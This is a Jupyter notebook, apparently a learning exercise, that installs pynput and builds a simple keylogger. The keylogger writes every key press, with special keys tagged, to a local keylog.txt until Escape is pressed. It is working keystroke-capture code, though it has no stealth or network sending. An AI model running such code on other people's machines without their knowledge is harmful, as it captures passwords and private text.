{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "38434dcc-b7f1-4791-b43c-6ded564af3cc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading pynput-1.7.7-py2.py3-none-any.whl.metadata (31 kB)\n",
      "Requirement already satisfied: six in c:\\users\\hp\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Downloading pynput-1.7.7-py2.py3-none-any.whl (90 kB)\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---------------------------------------- 90.2/90.2 kB 2.6 MB/s eta 0:00:00\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.7\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "5b8cc17d-36b9-4673-a2c7-c268cb6ba598",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "0bb542d0-245c-4e89-9411-3bcd80a500d2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Escape key pressed. Stopping keylogger.\n",
      "Escape key pressed. Stopping keylogger.\n",
      "Escape key pressed. Stopping keylogger.\n",
      "Escape key pressed. Stopping keylogger.\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "# File to store the keystrokes\n",
    "log_file = \"keylog.txt\"\n",
    "\n",
    "# Function to handle key press events\n",
    "def on_press(key):\n",
    "    try:\n",
    "        # Try to log the character directly\n",
    "        with open(log_file, \"a\") as file:\n",
    "            file.write(f\"{key.char}\")\n",
    "    except AttributeError:\n",
    "        # Handle special keys\n",
    "        if key == keyboard.Key.esc:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(\"[ESC]\")\n",
    "        elif key == keyboard.Key.enter:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(\"[ENTER]\\n\")\n",
    "        elif key == keyboard.Key.space:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(\" \")\n",
    "        elif key == keyboard.Key.backspace:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(\"[BACKSPACE]\")\n",
    "        elif key == keyboard.Key.tab:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(\"[TAB]\")\n",
    "        elif key == keyboard.Key.shift:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(\"[SHIFT]\")\n",
    "        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(\"[CTRL]\")\n",
    "        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(\"[ALT]\")\n",
    "        else:\n",
    "            with open(log_file, \"a\") as file:\n",
    "                file.write(f\"[{key}]\")\n",
    "\n",
    "# Function to handle key release events\n",
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc:\n",
    "        print(\"Escape key pressed. Stopping keylogger.\")\n",
    "        return False\n",
    "\n",
    "# Setting up the listener\n",
    "listener = keyboard.Listener(on_press=on_press, on_release=on_release)\n",
    "listener.start()\n",
    "listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "59b57396-e1d0-4b21-ba67-f1fd134094a3",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc:\n",
    "        print(\"Escape key pressed. Stopping keylogger.\")\n",
    "        return False\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
